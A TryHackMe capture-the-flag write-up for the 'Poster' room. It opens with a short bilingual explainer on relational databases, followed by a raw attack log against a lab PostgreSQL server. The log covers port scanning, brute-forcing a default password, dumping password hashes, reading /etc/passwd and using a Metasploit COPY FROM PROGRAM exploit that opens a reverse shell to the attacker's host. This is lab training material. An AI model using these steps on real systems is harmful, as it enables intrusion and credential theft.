---
The sys admin set up a rdbms in a safe way.
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/37983213b742f063a0b1fbd37a32d1e1.png)

### What is rdbms?   

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

  

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

  

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.


RDBMS es un sistema de gestión de bases de datos relacionales. Un ejemplo de RDBMS comúnmente utilizado es MySQL.

Un RDBMS almacena datos en forma de tablas, donde cada tabla tiene un conjunto de filas y columnas. Las filas representan registros individuales y las columnas representan atributos de esos registros. Las tablas también pueden relacionarse entre sí mediante claves foráneas, lo que permite a los usuarios consultar y combinar datos de varias tablas de manera sencilla.

Por ejemplo, una base de datos de una empresa podría tener una tabla de empleados y otra tabla de departamentos. La tabla de empleados podría tener una columna llamada "ID de departamento" que se relaciona con la tabla de departamentos mediante una clave foránea. De esta manera, podríamos obtener información sobre los empleados y sus departamentos correspondientes sin tener que almacenar toda la información en una sola tabla.



Are you able to complete the challenge?  

The machine may take up to 5 minutes to boot and configure  

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.183.253 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.183.253:22
Open 10.10.183.253:80
Open 10.10.183.253:5432
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-24 12:06 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:06
Completed NSE at 12:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:06
Completed NSE at 12:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:06
Completed NSE at 12:06, 0.00s elapsed
Initiating Ping Scan at 12:06
Scanning 10.10.183.253 [2 ports]
Completed Ping Scan at 12:06, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:06
Completed Parallel DNS resolution of 1 host. at 12:06, 0.02s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:06
Scanning 10.10.183.253 [3 ports]
Discovered open port 80/tcp on 10.10.183.253
Discovered open port 22/tcp on 10.10.183.253
Discovered open port 5432/tcp on 10.10.183.253
Completed Connect Scan at 12:06, 0.20s elapsed (3 total ports)
Initiating Service scan at 12:06
Scanning 3 services on 10.10.183.253
Completed Service scan at 12:07, 7.40s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.183.253.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 6.63s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 1.24s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
Nmap scan report for 10.10.183.253
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-12-24 12:06:57 EST for 16s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71ed48af299e30c1b61dffb024cc6dcb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGK2azIgGLY4GFFZlpgMpyOub/To5vmftSEWkjbtFkTBvc5tW/SpoDtjyNMT0JKJUmFJ2/vp6oIpwyIRtDa+oomuNL//exbp/i798hl8FFo4Zq5HsDvQCwNKZ0lfk0HGYgbXj6WAjohokSbkDY1U26FN/MKE2JxcXLcN8n1QmvVbP5p8zO/jgrXvX6DLv4eHxJjhzsBJ6DwFMchtBwy4CiTQsiCUcAyyua93LJO6NEnnM4SOwOUE/wyggCNPbwzB1wzPLAgaiU+M2gn9/XZGmlD+vWOBu3sruCB2PnRuM3cx27gDbbElR4KDIOq2ar66rV+yIZQoQ7KfVUNUFFCbRz
|   256 eb3aa34e6f1000abeffcc52b0edb4057 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN2f/wWkOMnH6rNZ+0m2p+PrzBVbz/vfQ/k9rx9W27i9DLBKmRM2b2ntmg8tSwHhZVTb/FvStJci9SIBLAqao00=
|   256 3e4142353805d392eb4939c6e3ee78de (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYg/uhFbBiQ1iu6NNNYtD/tRDbHmPXw4p/nYv+twijq
80/tcp   open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql syn-ack PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-29T00:54:25
| Not valid after:  2030-07-27T00:54:25
| MD5:   da573213e9aa9274d0bec1b0bbb20b09
| SHA-1: 4e03846928f7673b2bb204404ba9e4d2a0d05dd5
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAIrmTOUt3qZtMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBnVidW50dTAeFw0yMDA3MjkwMDU0MjVaFw0zMDA3MjcwMDU0MjVaMBExDzAN
| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMca
| tkPhi1xPkNomQzkTX+XRDk0RPBxRJQm17+Q8sru8J72rToPVyZesM7v5M+ttfqlZ
| sHAevEv/iVb1D6hNPawU9kG61Ja9baHd1s31H7RjWxpMS2vZuiu6/oXNWpc4yinQ
| RDWgLqKhDzczacMWLxKkgh06H8DI04/4pCJ6pbf6gXFfVRrccOu1FmoVlWWdVeGd
| CZ2C8XOA1tEEE6UG9HI9Q2gd3AHOSex+ar3EnWm1LanYDQPJSXEgl/K2A9D5DQEw
| +xJxPnH9abqxUrLUDOxzbMpdqXfb0OHxy7jeBJhpd6DonAZTEACdsgh9SzssH4ac
| FOqjsJjfSzok3x3uBx0CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAxGskqCN0uihEe1rpb7fveGYGMhDsFso9aYdJ4Q3CHJHX3leCN92nLCOq
| R9bTRgVjrvph00jO3+qhHzXCLbnpZXu9R9mPsfcDU/IFCFxMNmjRs4DkkzpGWAyp
| t5I18Zxh4JWJP7Mf1zc39z2Zk/IucAI5kMPMDJUWR/mjVFG/iZY8W+YlKsfvWblU
| tY4RYFhVy9JTVFYe5ZxghLxylYi+cbkGcPMj7qaOkDWIWhILZX1DDAb7cSfVd4rq
| 2ayWhA4Dh/FJkL2j+5mfAku0C7qMAqSlJTMRa6pTQjXeGafLDBoomQIIFnhWOITS
| fohtzsob6PyjssrRoqlRkJLJEJf2YQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:07
Completed NSE at 12:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.52 seconds


┌──(kali㉿kali)-[~]
└─$ searchsploit PostgreSQL             
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
PostgreSQL - 'bitsubstr' Buffer Overflow                                 | linux/dos/33571.txt
PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                             | immunix/local/19875.txt
PostgreSQL 7.x - Multiple Vulnerabilities                                | linux/dos/25076.c
PostgreSQL 8.01 - Remote Reboot (Denial of Service)                      | multiple/dos/946.c
PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                       | linux/local/7855.txt
PostgreSQL 8.3.6 - Conversion Encoding Remote Denial of Service          | linux/dos/32849.txt
PostgreSQL 8.3.6 - Low Cost Function Information Disclosure              | multiple/local/32847.txt
PostgreSQL 8.4.1 - JOIN Hashtable Size Integer Overflow Denial of Servic | multiple/dos/33729.txt
PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)        | multiple/remote/46813.rb
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)        | multiple/remote/50847.py
PostgreSQL 9.4-0.5.3 - Privilege Escalation                              | linux/local/45184.sh
------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


┌──(kali㉿kali)-[~]
└─$ msfconsole -q                                                                               
msf6 > search PostgreSQL

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   4   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution                                                                  
   5   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution                                                                            
   6   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection                                                            
   7   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility                                                                                        
   8   auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query                                                                                 
   9   auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query                                                                                 
   10  auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe                                                                                        
   11  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution                                                                          
   12  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution                                                              
   13  auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   14  post/linux/gather/vcenter_secrets_dump                      2022-04-15       normal     No     VMware vCenter Secrets Dump


Interact with a module by name or index. For example info 14, use 14 or use post/linux/gather/vcenter_secrets_dump                                                                                                    

msf6 > use 7
msf6 auxiliary(scanner/postgres/postgres_login) > show options

Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting             Required  Description
   ----              ---------------             --------  -----------
   BLANK_PASSWORDS   false                       no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                           yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                   yes       The database to authenticate against
   DB_ALL_CREDS      false                       no        Try each user/password couple stored in the cu
                                                           rrent database
   DB_ALL_PASS       false                       no        Add all passwords in the current database to t
                                                           he list
   DB_ALL_USERS      false                       no        Add all users in the current database to the l
                                                           ist
   DB_SKIP_EXISTING  none                        no        Skip existing credentials stored in the curren
                                                           t database (Accepted: none, user, user&realm)
   PASSWORD                                      no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-fram  no        File containing passwords, one per line
                     ework/data/wordlists/postg
                     res_default_pass.txt
   Proxies                                       no        A proxy chain of format type:host:port[,type:h
                                                           ost:port][...]
   RETURN_ROWSET     true                        no        Set to true to see query result sets
   RHOSTS                                        yes       The target host(s), see https://github.com/rap
                                                           id7/metasploit-framework/wiki/Using-Metasploit
   RPORT             5432                        yes       The target port
   STOP_ON_SUCCESS   false                       yes       Stop guessing when a credential works for a ho
                                                           st
   THREADS           1                           yes       The number of concurrent threads (max one per
                                                           host)
   USERNAME                                      no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-fram  no        File containing (space-separated) users and pa
                     ework/data/wordlists/postg            sswords, one pair per line
                     res_default_userpass.txt
   USER_AS_PASS      false                       no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-fram  no        File containing users, one per line
                     ework/data/wordlists/postg
                     res_default_user.txt
   VERBOSE           true                        yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/postgres/postgres_login) > set rhost 10.10.183.253
rhost => 10.10.183.253
msf6 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.183.253:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.183.253:5432 - Login Successful: postgres:password@template1
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.183.253:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf6 auxiliary(scanner/postgres/postgres_login) > use auxiliary/admin/postgres/postgres_sql
msf6 auxiliary(admin/postgres/postgres_sql) > show options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   DATABASE       template1         yes       The database to authenticate against
   PASSWORD       postgres          no        The password for the specified username. Leave blank for a
                                              random password.
   RETURN_ROWSET  true              no        Set to true to see query result sets
   RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploi
                                              t-framework/wiki/Using-Metasploit
   RPORT          5432              yes       The target port
   SQL            select version()  no        The SQL query to execute
   USERNAME       postgres          yes       The username to authenticate as
   VERBOSE        false             no        Enable verbose output


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/postgres/postgres_sql) > set rhost 10.10.183.253
rhost => 10.10.183.253
msf6 auxiliary(admin/postgres/postgres_sql) > set password password
password => password
msf6 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.183.253

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 2016
    0609, 64-bit

[*] Auxiliary module execution completed

msf6 auxiliary(admin/postgres/postgres_sql) > search postgre

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   4   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution                                                                  
   7   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution                                                                            
   8   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection                                                            
   9   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility                                                                                        
   10  auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query                                                                                 
   11  auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query                                                                                 
   12  auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe                                                                                        
   13  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution                                                                          
   14  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution                                                              
   15  auxiliary/scanner/postgres/postgres_hashdump                                 normal     No     Postgres Password Hashdump                                                                                      
   16  auxiliary/scanner/postgres/postgres_schemadump                               normal     No     Postgres Schema Dump                                                                                            
   17  auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   18  post/linux/gather/vcenter_secrets_dump                      2022-04-15       normal     No     VMware vCenter Secrets Dump


Interact with a module by name or index. For example info 18, use 18 or use post/linux/gather/vcenter_secrets_dump                                                                                                    

msf6 auxiliary(admin/postgres/postgres_sql) > use auxiliary/scanner/postgres/postgres_hashdump
msf6 auxiliary(scanner/postgres/postgres_hashdump) > show options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random
                                         password.
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-fram
                                        ework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         yes       The username to authenticate as


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/postgres/postgres_hashdump) > set rhost 10.10.183.253
rhost => 10.10.183.253
msf6 auxiliary(scanner/postgres/postgres_hashdump) > set password password
password => password
msf6 auxiliary(scanner/postgres/postgres_hashdump) > run

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf6 auxiliary(scanner/postgres/postgres_hashdump) > use auxiliary/admin/postgres/postgres_readfile 
msf6 auxiliary(admin/postgres/postgres_readfile) > show options

Module options (auxiliary/admin/postgres/postgres_readfile):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random
                                         password.
   RFILE     /etc/passwd      yes       The remote file
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-fram
                                        ework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


View the full module info with the info, or info -d command.

msf6 auxiliary(admin/postgres/postgres_readfile) > set rhost 10.10.183.253
rhost => 10.10.183.253
msf6 auxiliary(admin/postgres/postgres_readfile) > set password password
password => password
msf6 auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.10.183.253

Query Text: 'CREATE TEMP TABLE SdoVdFUHYe (INPUT TEXT);
      COPY SdoVdFUHYe FROM '/etc/passwd';
      SELECT * FROM SdoVdFUHYe'
=================================================================================================================================

    input
    -----
    #/home/dark/credentials.txt
    _apt:x:105:65534::/nonexistent:/bin/false
    alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    dark:x:1001:1001::/home/dark:
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    messagebus:x:106:110::/var/run/dbus:/bin/false
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    root:x:0:0:root:/root:/bin/bash
    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    syslog:x:104:108::/home/syslog:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    uuidd:x:107:111::/run/uuidd:/bin/false
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

#/home/dark/credentials.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
[+] 10.10.183.253:5432 Postgres - /etc/passwd saved in /home/kali/.msf4/loot/20221224122634_default_10.10.183.253_postgres.file_545925.txt
[*] Auxiliary module execution completed

msf6 auxiliary(admin/postgres/postgres_readfile) > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > show options

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DATABASE           template1        yes       The database to authenticate against
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   PASSWORD           postgres         no        The password for the specified username. Leave blank for
                                                  a random password.
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasp
                                                 loit-framework/wiki/Using-Metasploit
   RPORT              5432             yes       The target port (TCP)
   TABLENAME          RhMQTIYV3Ey      yes       A table name that does not exist (To avoid deletion)
   USERNAME           postgres         yes       The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.


msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhost 10.10.183.253
rhost => 10.10.183.253
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password password
password => password
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost 10.8.19.103
lhost => 10.8.19.103
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] 10.10.183.253:5432 - 10.10.183.253:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.183.253:5432 - Exploiting...
[+] 10.10.183.253:5432 - 10.10.183.253:5432 - RhMQTIYV3Ey dropped successfully
[+] 10.10.183.253:5432 - 10.10.183.253:5432 - RhMQTIYV3Ey created successfully
[+] 10.10.183.253:5432 - 10.10.183.253:5432 - RhMQTIYV3Ey copied successfully(valid syntax/command)
[+] 10.10.183.253:5432 - 10.10.183.253:5432 - RhMQTIYV3Ey dropped successfully(Cleaned)
[*] 10.10.183.253:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.8.19.103:4444 -> 10.10.183.253:59728) at 2022-12-24 12:33:12 -0500


whoami
postgres
shel
shell
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[*] Found python3 at /usr/bin/python3
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
bash
bash

postgres@ubuntu:/var/lib/postgresql/9.5/main$ find / -type f -name user.txt 2>/dev/null
<stgresql/9.5/main$ find / -type f -name user.txt 2>/dev/null                
/home/alison/user.txt
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cat /home/alison/user.txt
cat /home/alison/user.txt
cat: /home/alison/user.txt: Permission denied
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cd /var/www/html
